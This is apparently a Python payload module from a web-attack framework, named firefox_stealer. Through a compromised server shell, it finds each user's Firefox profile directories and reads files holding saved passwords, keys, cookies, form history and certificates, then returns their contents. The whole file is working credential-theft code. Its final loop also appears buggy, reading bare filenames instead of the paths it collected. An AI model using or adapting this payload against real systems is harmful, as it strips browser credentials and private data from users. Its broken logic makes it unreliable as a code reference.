import re
from plugins.attack.payloads.base_payload import base_payload

#TODO: Provide support for downloading
class firefox_stealer(base_payload):
    '''
    This payload steals Mozilla Firefox information
    '''
    def run_read(self):
        result = []
        files = []

        files.append('bookmarks.html')
        files.append('content-prefs.sqlite')
        files.append('cookies.sqlite-journal')
        files.append('downloads.sqlite')
        files.append('permissions.sqlite')
        files.append('key3.db')
        files.append('signons.sqlite')
        files.append('cert8.db')
        files.append('formhistory.sqlite')

        def parse_mozilla_dir_path (profile):
            path = re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
            if path:
                return path
            else:
                return ''

        users_folders = run_payload('users_folders')
        for users in users_folders:
            list = parse_mozilla_dir_path(self.shell.read(users+'.mozilla/firefox/profiles.ini'))
            if list:
                for folder in list:
                    for file in files:
                        if self.shell.read(users+'.mozilla/firefox/'+folder+'/'+file):
                            result.append(users+'.mozilla/firefox/'+folder+'/'+file)

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        if result == [ ]:
            console('Stealing files didnt work, Server is configured correctly')
        return result
